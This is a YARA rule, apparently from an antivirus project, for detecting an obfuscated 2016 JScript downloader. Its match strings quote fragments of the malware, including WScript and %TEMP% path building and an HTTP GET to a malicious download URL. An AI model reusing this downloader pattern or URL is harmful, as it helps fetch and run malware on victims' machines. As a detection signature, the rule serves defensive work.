rule sig_20160428_b2c5768cda12621e02876ea5e27ddce4 {
  meta:
    description = "datamaliciousorder - file 20160428_b2c5768cda12621e02876ea5e27ddce4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e7a2486c947c9a85319ba6262019df4122a6bbbfdd27f30eed86fa6035b0bcf2"

  strings:
    $s1  = "function CddJaiDvtXeyAmtVhaNcl(PgeQaoZlwZbfRdyUruZkf){RddEvjQkgKnwHerGouUik[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function CddJaiDvtXeyAmtVhaNcl(PgeQaoZlwZbfRdyUruZkf){RddEvjQkgKnwHerGouUik[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function TwfXpoDrqCjeJpuIniKjm() {return RddEvjQkgKnwHerGouUik[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "var RddEvjQkgKnwHerGouUik = function GftAadCqyReeOymPttDkh() {return ByaJabLlwBzwSyaDflBno[KbfXuxMptHpyIeoVuzFmw](\"WScript\"+\"" ascii
    $s5  = "function OrcXbpDuaRcnDdbXbuZrv(WciWyvFqoVhdLjxSpwCdg, MpnGuxScfPbmWmxHmvDiv){AwoPefFjwSvjYhqRfkAol = AwoPefFjwSvjYhqRfkAol * 1; " ascii
    $s6  = "return WciWyvFqoVhdLjxSpwCdg - MpnGuxScfPbmWmxHmvDiv;};" fullword ascii
    $s7  = "LrsChpCkmHofKvpAojKjl[XkaFleEwlZovQypZnrCjn](\"G\" + \"ET\", \"http://zahariev.myjino.ru/n8sja\", false);" fullword ascii
    $s8  = "var ByaJabLlwBzwSyaDflBno = this[\"WScript\"];" fullword ascii
    $s9  = "var RddEvjQkgKnwHerGouUik = function GftAadCqyReeOymPttDkh() {return ByaJabLlwBzwSyaDflBno[KbfXuxMptHpyIeoVuzFmw](\"WScript\"+\"" ascii
    $s10 = "function TwfXpoDrqCjeJpuIniKjm() {return RddEvjQkgKnwHerGouUik[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function OrcXbpDuaRcnDdbXbuZrv(WciWyvFqoVhdLjxSpwCdg, MpnGuxScfPbmWmxHmvDiv){AwoPefFjwSvjYhqRfkAol = AwoPefFjwSvjYhqRfkAol * 1; " ascii
    $s12 = "if (LrsChpCkmHofKvpAojKjl[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function OqkNpgMkeMquGgjBefGqk() {return ((ObzMydWfkUaoAcyRqvEte == true) && (ObzMydWfkUaoAcyRqvEte == OtxUzbXkeQrjEcyTpeGou)) ?" ascii
    $s14 = "function OqkNpgMkeMquGgjBefGqk() {return ((ObzMydWfkUaoAcyRqvEte == true) && (ObzMydWfkUaoAcyRqvEte == OtxUzbXkeQrjEcyTpeGou)) ?" ascii
    $s15 = "VgiMykNusUaeVhuTvqCqu = true;" fullword ascii
    $s16 = "function DauZddOwvSksXzuNrtEch(FjgYexRrwMqeDvsWacEsl) {var GhtDezLmsGqvSnaZkcGvq = (1, 2, 3, 4, 5, FjgYexRrwMqeDvsWacEsl); retur" ascii
    $s17 = "ObzMydWfkUaoAcyRqvEte = true; " fullword ascii
    $s18 = "function DauZddOwvSksXzuNrtEch(FjgYexRrwMqeDvsWacEsl) {var GhtDezLmsGqvSnaZkcGvq = (1, 2, 3, 4, 5, FjgYexRrwMqeDvsWacEsl); retur" ascii
    $s19 = "var OtxUzbXkeQrjEcyTpeGou = false;" fullword ascii
    $s20 = "var ObzMydWfkUaoAcyRqvEte = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}